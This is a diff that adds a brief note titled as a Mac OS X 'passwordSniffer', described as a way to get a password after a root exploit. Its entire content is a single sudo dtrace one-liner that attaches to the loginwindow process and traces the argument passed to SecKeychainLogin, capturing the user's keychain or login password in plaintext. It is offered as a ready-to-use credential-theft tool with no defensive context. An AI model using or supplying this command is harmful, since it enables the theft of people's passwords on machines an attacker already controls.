@@ -1,0 +1,9 @@
+MAC OSx
+
+passwordSniffer in 138 chars
+
+how to get a password after root exploit
+
+ 
+
+sudo dtrace -n 'pid$target::SecKeychainLogin:entry{trace(copyinstr(uregs[R_ECX]));}' -p $(ps -A | grep -m1 loginwindow | awk '{print $1}')
